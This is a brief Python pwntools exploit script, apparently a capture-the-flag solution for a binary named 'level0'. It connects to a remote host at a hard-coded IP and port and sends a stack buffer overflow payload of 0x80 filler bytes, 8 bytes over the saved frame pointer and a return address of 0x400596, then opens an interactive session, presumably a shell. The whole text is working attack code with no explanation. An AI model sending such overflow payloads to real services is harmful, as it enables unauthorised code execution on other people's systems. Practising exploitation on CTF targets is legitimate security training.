from pwn import *

# p = process("./level0")
p = remote("111.198.29.45" , 30289)

p.sendafter("\n" , "a" * 0x80 + "b" * 8 + p64(0x400596))

p.interactive()